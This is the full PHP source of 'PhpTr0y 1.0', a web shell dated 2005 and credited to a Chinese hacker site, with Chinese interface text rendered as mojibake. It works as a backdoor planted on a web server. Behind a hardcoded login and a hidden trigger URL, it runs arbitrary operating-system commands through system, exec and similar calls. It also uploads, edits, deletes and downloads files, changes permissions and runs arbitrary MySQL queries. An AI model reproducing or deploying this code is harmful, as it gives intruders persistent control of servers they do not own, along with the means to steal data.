   <?
   /*----------------------------------------------------
   Php T-r-0*y 1.0 by ÌìFox.
   ZiBo ShanDong China.
   QQ:53423398.
   Webpages:http://www.chinahacker.info/
   Email:ooofox@msn.com
   ---------------------------------------------------*/
   error_reporting(7);

   $tr0yname="skyfox";
   $tr0ypass="password9";
   $checkmode['soc']="1";

   if ( !ini_get('register_globals') )
   {
       extract($_POST);
       extract($_GET);
       extract($_SERVER);
       extract($_FILES);
       extract($_ENV);
       extract($_COOKIE);
       if ( isset($_SESSION) )
       {
           extract($_SESSION);
       }
   }
   if ($checkmode['soc']=="1"){
   session_start();

      if ($_GET['get'] == "logout") {
      session_destroy();
      echo "<body onLoad=\"setTimeout('window.opener=null;window.close()', 3000)\">";
      echo "<span style=\"font-size:12px;font-family: Tahoma\">ÍË³ö³É¹¦´°¿ÚÔÚ3ÃëÖÖºó¹Ø±Õ<p></span>";
      exit;
      }
       if ($_SESSION['admin']==$tr0yname && $_SESSION['pass']==$tr0ypass){
       $_SESSION['admin']=$tr0yname && $_SESSION['pass']=$tr0ypass;}else{
       if ($tr0yname==$_POST['name'] && $tr0ypass==$_POST['pass'])
       {
       $_SESSION['admin']=$tr0yname && $_SESSION['pass']=$tr0ypass;
       }else{
       login();
       }
   }
   }
   else
   {

     if ($_GET['get']=="logout"){
     setcookie ("admin", "");
     echo "<body onLoad=\"setTimeout('window.opener=null;window.close()', 3000)\">";
     echo "<span style=\"font-size:12px;font-family: Tahoma\">ÍË³ö³É¹¦´°¿ÚÔÚ3ÃëÖÖºó¹Ø±Õ<p></span>";
      exit;
      }
       if (setcookie ("admin",$tr0ypass,time()+(1*24*3600))){
       setcookie ("admin",$tr0ypass,time()+(1*24*3600));}else{
       if ($tr0yname==$_POST['name'] && $tr0ypass==$_POST['pass'])
       {
       setcookie ("admin",$tr0ypass,time()+(1*24*3600));
       }else{
       login();
       }
   }
   }
   if(!empty($down)) {
       if (!@file_exists($down)) {
       echo "<script>alert('ÄãÒªÏÂµÄÎÄ¼þ²»´æÔÚ!')</script>";
       } else {
       $filename = basename($down);
       $filename_info = explode('.', $filename);
       $fileext = $filename_info[count($filename_info)-1];
       header('Content-type: application/x-'.$fileext);
       header('Content-Disposition: attachment; filename='.$filename);
       header('Content-Description: PHP Generated Data');
       header('Content-Length: '.filesize($down));
       @readfile($down);
       exit;
       }
   }


   $tr0ypath=str_replace('\\','/',dirname(__FILE__));
   if (!isset($dirs) or empty($dirs)) {
       $dirs = ".";
       $nowpath = getPath($tr0ypath, $dirs);
   } else {
       $dirs=$_GET['dirs'];
       $nowpath = getPath($tr0ypath, $dirs);
   }
   if (get_magic_quotes_gpc()) {
   $_GET = stripslashes_array($_GET);
   $_POST = stripslashes_array($_POST);
   }

   ?>
   <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
   <html xmlns="http://www.w3.org/1999/xhtml"  lang="zh-CN"/>
   <head>
   <title>PhpTr0y bY ÌìFox <? echo "µ±Ç°ÏµÍ³: ".PHP_OS.""?></title>
   <meta http-equiv=Content-Language content="text/html; charset=gb2312" />
   <style type="text/css">
   body{margin:0px;PADDING:0px;font-family:"Tahoma", Verdana, Lucida, Arial, Helvetica, ËÎÌå,sans-serif;color:#FFF;font-size:12px;background:#677D92 left top;}
   #title{margin:0px;padding:0px 0px 0px 0px;background:#8C0700;width:606px;LINE-HEIGHT:18px;}
   #body{margin:0px;padding:0px 0px 0px 0px;width:600px;color:#FFF;background:#556B80;LINE-HEIGHT:150%;text-align:left;border:#768CA3 3px solid;}
   #action{width:601px;color:#FFF;padding:0px 0px 0px 5px;background:#8C0700;text-align:left;}
   a:link{font-weight:normal;text-decoration:none;color:#FFF;}
   a:visited {font-weight:normal;text-decoration:none;color:#FFF;}
   a:hover {font-weight:normal;text-decoration:none;color:#FFF;}
   a:active {font-weight:normal;text-decoration:none;color:#FFF;}
   form{margin:0}
   select {background-color: #ffffff; color: #000000; font-size: 12px; border: 0px #cccccc double}
   input,textarea {background-color: #ffffff; color: #000000; font-family: tahoma; font-size: 12px; border: 1px #cccccc double;}
   option {font-size: 12px; background-color: #f3f3f3; color: #51485f;}
   </style>
   <SCRIPT language=JavaScript>
   function CheckAll(form)
   {
       for (var i=0;i<form.elements.length;i++)
       {
           var e = form.elements[i];
           if (e.name != 'selectall')
           e.checked = form.selectall.checked;
       }
   }
   </SCRIPT>
   </head>
   <body>
   <div align="center">
   <div id="title"><a href="http://www.chinahacker.info/" target="new"><b>PhpTr0y1.0</b></a>&nbsp;|&nbsp;<a href="<?=$_SERVER['PHP_SELF']?>"><b>·µ»Ø¸ùÄ¿Â¼</b></a>&nbsp;|&nbsp;<a href="?get=logout"><b>ÍË³ö</b></a>&nbsp;|&nbsp;<a href="?dir=phpinfo" target="new"><b>Phpinfo()</b></a>&nbsp;|&nbsp;<a
   href="?dir=shell"><b>Webshell</b></a>&nbsp;|&nbsp;<a href="?dir=mysql"><b>Mysql</b></a></div><br />
   <div id="body"><div align="left">µ±Ç°Ä¿Â¼Î»ÖÃ:<?=$nowpath?>/<br />³ÌÐòËùÔÚÎ»ÖÃ:<?=$tr0ypath?>/<br />
       <form action="" method="get">Ìø×ªµ½Ö¸¶¨Ä¿Â¼:<input name="dirs" type="text" /><input type="submit" name="dirs" value="È·¶¨" /></form>
       <form action="" method="post" enctype="multipart/form-data">ÉÏ´«ÎÄ¼þµ½µ±Ç°Î»ÖÃ:<input name="uploadfiles" type="file" /><input

   type="submit" name="uploadfile" value="È·¶¨"><input type="hidden" name="uploaddir" value="<?=$dirs?>" /></form>
       <form action="" method="post">ÔÚµ±Ç°Ä¿Â¼½¨Á¢ÎÄ¼þ¼Ð:<input name="newdir" type="text" value=""><input type="submit" name="createdir" value="È·¶¨"></form>
       <form action="" method="post">ÔÚµ±Ç°Ä¿Â¼ÐÂ½¨ÎÄ¼þ:<input name="newfile" type="text" value=""><input type="submit" name="createfile" value="È·¶¨"></form></div></div><br /><?
   if($entereditfile) {
       $filename="$editfilename";
       @$fp=fopen("$filename","w");
       echo $msg=@fwrite($fp,$_POST['content']) ? "Ð´ÈëÎÄ¼þ³É¹¦" : "Ð´ÈëÊ§°Ü";
       @fclose($fp);
   }
   elseif ($createdir){
       $newdirectory=$_POST['newdir'];
       if (@mkdir($newdirectory, 0777)){
       echo"<meta http-equiv=Content-Language content=\"text/html; charset=gb2312\" />";
       echo "½¨Á¢Ä¿Â¼³É¹¦Çëµã»÷ÕâÀï·µ»Ø.Èç¹ûÃ»ÓÐ·¢ÏÖÄ¿Â¼ÇëË¢ÐÂÒ³Ãæ.";
       }else{
       echo"<meta http-equiv=Content-Language content=\"text/html; charset=gb2312\" />";
       echo "½¨Á¢Ä¿Â¼Ã»ÓÐ³É¹¦,¿ÉÄÜÊÇÏÖÔÚµÄÈ¨ÏÞ½ÏµÍÔì³ÉµÄ»òÕßÄãÒª´´½¨µÄÄ¿Â¼ÒÑ¾´æÔÚ.ÇëÅäÖÃµ±Ç°È¨ÏÞ.";
       }
       }
   elseif ($createfile) {
       $newfile=$_POST['newfile'];
   ?>
   <div id="body">³ÌÐòÃû³Æ&ÄÚÈÝ:<form action="?dir=<?=urlencode($dir)?>" method="post"><input maxLength="100" size="50" name="editfilename"
   value="<?=$newfile?>" /><br /><textarea name="content" rows="23" cols="115"></textarea><br /><input type="submit"  name="entereditfile"
   value="È·¶¨ÐÂ½¨" /></form></div>
   <?
   }
   elseif($chmod){
       $rechmod=base_convert($_POST['rechmod'],8,10);
       echo $msg=chmod($dir."/".$file,$rechmod) ? "È¨ÏÞÐÞ¸Ä³É¹¦," : "È¨ÏÞÐÞ¸ÄÊ§°Ü,";
       echo "ÐÞ¸ÄºóµÄÊôÐÔÎª:".substr(base_convert(fileperms($dir."/".$file),10,8),-4)."";
   }
   elseif($rename){
       echo $msg=rename($dirs."/".$renamefile,$dirs."/".$renamefile2) ? "ÐÞ¸ÄÎÄ¼þÃû³É¹¦" : "ÐÞ¸ÄÎÄ¼þÃûÊ§°Ü";
   }
   elseif(@$delfile!="") {
       if(file_exists($delfile)) {
       if (@unlink($delfile)) {
       echo "".$delfile." É¾³ý³É¹¦!";
       } else {
       echo "ÎÄ¼þÉ¾³ýÊ§°Ü!";
   }
       } else {
       echo "ÎÄ¼þ²»´æÔÚ,É¾³ýÊ§°Ü!";
       }
   }

   elseif($deldir) {
       if($deldir!="") {
       if(!file_exists("$deldir")) {
       echo "Ä¿Â¼ÒÑ²»´æÔÚ!";
       } else {
       if (@rmdir($deldir)){
       echo "Ä¿Â¼É¾³ý³É¹¦";
       }else{
       echo "É¾³ýÊ§°Ü!";
       }
   }
   }
   }
   elseif($uploadfile) {
       echo $msg=@copy($_FILES['uploadfiles']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfiles']['name']."") ? "ÉÏ´«³É¹¦" : "ÉÏ´«Ê§°Ü";
   }
   if($sql!=""){
   $sql = trim(stripslashes($sql));
          mysql_query($sql,$conn);
          if(mysql_errno()==0)
          {
                 $errInfo = "³É¹¦Ö´ÐÐÖ¸¶¨µÄSQLÖ¸Áî£¡";
          }
          else
          {
                 $errInfo = mysql_error();
          }
   }
   if (!isset($_GET['dir']) OR empty($_GET['dir']) OR ($_GET['dir'] == "dir")){
   $handle=@opendir($dirs);
   while ($file = @readdir($handle)) {
       $test="$dirs/$file";
       $retest=@is_dir($test);
           if ($retest=="1"){
       $filesize=@filesize($file);
               if($file!=".." && $file!="."){
                   $ctime=@date("Y-m-d H:i:s",@filectime($test));
                $mtime=@date("Y-m-d H:i:s",@filemtime($test));
                   $dirperm=@substr(@base_convert(@fileperms($test),10,8),-4);
       echo "<div id=\"body\"><a href=\"?dirs=".urlencode($dirs)."/".urlencode($file)."\" title=\"´´½¨Ê±¼ä: $ctime ×îºóÐÞ¸ÄÊ±¼ä: $mtime\">Ä¿Â¼Ãû³Æ:<b>$file</b></a>&nbsp;
   ÎÄ¼þ´óÐ¡: $filesize KB &nbsp;&nbsp; È¨ÏÞÊôÐÔ: $dirperm<br /><a href=\"?dir=".urlencode($dirs)."&deldir=".urlencode($dirs)."/".urlencode($file)."\" target=\"new\">É¾³ý</a> <a href=\"?get=newname&newname=$file\" target=\"new\">¸ÄÃû</a> &nbsp;&nbsp;´´½¨Ê±¼ä: $ctime ×îºóÐÞ¸ÄÊ±¼ä: $mtime</div>\n <br />";
       }else{
       if ($file==".."){
       echo"<div id=\"action\"><a href=\"?dirs=".urlencode($dirs)."/".urlencode($file)."\">ÉÏ¼¶Ä¿Â¼</a></div>";
   }}}}
   echo "<div id=\"title\">Ä¿Â¼¶ÁÈ¡Íê±Ï,ÒÔÏÂÊÇÎÄ¼þ.</div><br />";
   @closedir($handle);
   echo "<form action=\"\" method=\"post\">";
   $handle=@opendir($dirs);
   while ($file = @readdir($handle)) {
       $test="$dirs/$file";
       $retest=@is_dir($test);
           if ($retest=="0"){
           $filesize=@filesize($file);
           $ctime=@date("Y-m-d H:i:s",@filectime($test));
           $mtime=@date("Y-m-d H:i:s",@filemtime($test));
           $dirperm=@substr(@base_convert(@fileperms($test),10,8),-4);
       echo "<div id=\"body\"><a href=\"$test\" target=\"new\" title=\"´´½¨Ê±¼ä: $ctime ×îºóÐÞ¸ÄÊ±¼ä: $mtime\">ÎÄ¼þÃû
   ³Æ:<b> $file</b></a>&nbsp;ÎÄ¼þ´óÐ¡: $filesize KB &nbsp;|&nbsp; È¨ÏÞÊôÐÔ: <a href=\"?get=cmhod&dir=".urlencode($dirs)."&file=".urlencode($file)."\" target=\"new\">$dirperm</a><br /><a href=\"?down=".urlencode($test)."\">ÏÂÔØ</a> <a href=\"?edit=editfile&dir=".urlencode($dirs)."&editfile=".urlencode($file)."\" target=\"new\">±à¼</a> <a href=\"?dir=".urlencode($dirs)."&delfile=".urlencode($dirs)."/".urlencode($file)."\" target=\"new\">É¾³ý</a> <a href=\"?dir=rename&dirs=".urlencode($dirs)."&renamefile=".urlencode($file)."\" target=\"new\">¸ÄÃû</a> ´´½¨Ê±¼ä: $ctime ×îºóÐÞ¸ÄÊ±¼ä: $mtime</div>\n <br />";
           }else{}
   }
   @closedir($handle);

   }

   elseif ($_GET['dir'] == "phpinfo") {
       echo"<meta http-equiv=Content-Language content=\"text/html; charset=gb2312\" />";
       echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() º¯ÊýÒÑ±»½ûÓÃ.";
       exit;
   }
   elseif ($_GET['dir']=="rename"){
   echo "<form action=\"\" method=\"post\"><input name=\"renamefile2\" type=\"text\" value=$renamefile />";
   echo "<input type=\"hidden\" name=\"dirs\" value=$dirs />";
   echo "<input name=\"renamefile\" type=\"hidden\" value=$renamefile />";
   echo "<input type=\"submit\" name=\"rename\" value=\"È·¶¨\" /></form>";
   }

   elseif ($_GET['dir']=="shell"){
   ?>
   <div id="body">
   <form action="" method="post">
   <select name="execfunc" class="input">
   <option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option>
   <option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
   <option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
   <option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
   <option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
   </select>
   <input type="text" name="cmd" value="<?=$_POST['cmd']?>" />
   <input type="submit" value="È·¶¨" /><br />
   <textarea name="showbank" rows="23" cols="115" readonly="readonly"><?php
       if (!empty($_POST['cmd'])) {
           if ($execfunc=="system") {
               system($_POST['cmd']);
           } elseif ($execfunc=="passthru") {
               passthru($_POST['cmd']);
           } elseif ($execfunc=="exec") {
               $result = exec($_POST['cmd']);
               echo $result;
           } elseif ($execfunc=="shell_exec") {
               $result=shell_exec($_POST['cmd']);
               echo $result;
           } elseif ($execfunc=="popen") {
               $pp = popen($_POST['cmd'], 'r');
               $read = fread($pp, 2096);
               echo $read;
               pclose($pp);
           } else {
               system($_POST['cmd']);
           }
       }
       ?></textarea>
   </form>
   </div>
   <?
   }

   elseif ($_GET['dir']=="mysql") {
   ?>
   <div id="body">
   <form action="" method="post">
   ·þÎñÆ÷µØÖ·:<input type="text" name="mysqlhost" value="localhost:3306" />
   ÓÃ»§Ãû:<input type="text" name="mysqluser" value="root" /><br />
   Êý¾Ý¿âÃÜÂë:<input type="text" name="mysqlpass" value="" />
   Êý¾Ý¿â:<input type="text" name="mysqldb" value="" />
   <input type="submit" name="mysql" value="È·¶¨" />
   </form>
   </div>
   <?
   if ($mysql) {
   if($exec=mysql_connect($_POST['mysqlhost'],$_POST['mysqluser'],$_POST['mysqlpass']) and mysql_select_db($_POST['mysqldb'])) {
   echo "Êý¾Ý¿âÁ¬½Ó³É¹¦.";
   echo "<div id=\"body\"><form action=\"\" method=\"post\">";
   echo "<textarea name=\"sql\" rows=\"32\" cols=\"115\">$sql</textarea><br />";
   echo "<input type=\"submit\" value=\"È·¶¨\" />Äã¿ÉÒÔÔÚ´Ë´¦Ö´ÐÐMySQLÃüÁî.";
   echo "</form></div>";
   }else{
   echo "Êý¾Ý¿âÁ¬½ÓÊ§°Ü,Çë¼ì²éÊäÈëÄÚÈÝÊÇ·ñÕýÈ·.";
   }
   }
   }
   elseif ($_GET['get']=="cmhod"){
   ?>
   ÉèÖÃÈ¨ÏÞ:<form action="" method="post"><input type="text" name="file" value="<?=$file?>" readonly="readonly" /><br /><input type="text" name="rechmod" value="<?=@substr(@base_convert(@fileperms($dir."/".$file),10,8),-4)?>" /><input name="dir" type="hidden" value="<?=$_GET['dir']?>" /><input type="submit" name="chmod" value="È·¶¨" /></form>
   <?
   }
   elseif ($_GET['edit']=="editfile"){
       if ($newfile==""){
       $filename="$dir/$editfile";
       $fp=@fopen($filename,"r");
       $contents=@fread($fp, filesize($filename));
       @fclose($fp);
       $contents=htmlspecialchars($contents);
       }else{
       $editfile=$newfile;
       $filename = "$dir/$editfile";
       }

   ?>

       <div id="body">³ÌÐòÃû³Æ&ÄÚÈÝ:<form action="?dir=<?=urlencode($dir)?>" method="post"><input maxLength="100" size="50" name="editfilename"

   value="<?=$filename?>" /><br /><textarea name="content" rows="23" cols="115"><?=$contents?></textarea><br /><input type="submit"  name="entereditfile"

   value="È·¶¨±à¼" /></form></div>

   <?
   }

   ?>
   <div id="action">³ÌÐòÖÆ×÷:ÌìFox.ÃâÔðÉùÃ÷:´Ë³ÌÐò½öÓÃÓÚ¼¼Êõ½»Á÷,ÈÎºÎÎ¥·¨ÐÐÎªÓÚ³ÌÐò×÷ÕßÎÞ¹Ø.<br />Copyright &copy; 2005 Chinahacker.info All Rights Reserved.</div>
   </div>
   </body>
   </html>
   <?
   //º¯Êý¿â
   function login() {
           $get="www.chinahacker.info";
           if ($_GET['get']==$get) {
   ?>
   <style tpye="text/css">
   select {background-color: #ffffff; color: #000000; font-size: 12px; border: 0px #cccccc double;}
   input,textarea {background-color: #ffffff; color: #000000; font-family: tahoma; font-size: 12px; border: 1px #cccccc double;}
   option {font-size: 12px; background-color: #f3f3f3; color: #51485f;}
   </style>
   <form method="post" action="<?=$_SERVER['PHP_SELF']?>"><input name="name" type="text" id="name" /><br /><input name="pass" type="password" id="pass"

   /><br /><input type="submit" value="ok" /></form>
   <?
   }
   else
   {
   echo"";
   }
   exit;
   }
   function stripslashes_array(&$array) {
   while(list($key,$var) = each($array)) {
   if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
   if (is_string($var)) {
   $array[$key] = stripslashes($var);
   }
   if (is_array($var))  {
   $array[$key] = stripslashes_array($var);
   }
   }
   }
   return $array;
   }
   function getPath($mainpath, $relativepath) {
   global $dirs;
   $mainpath_info = explode('/', $mainpath);
   $relativepath_info       = explode('/', $relativepath);
   $relativepath_info_count = count($relativepath_info);
   for ($i=0; $i<$relativepath_info_count; $i++) {
   if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
   if ($relativepath_info[$i] == '..') {
   $mainpath_info_count = count($mainpath_info);
   unset($mainpath_info[$mainpath_info_count-1]);
   continue;
   }
   $mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
   } //end for
   return implode('/', $mainpath_info);
   }
   ?>
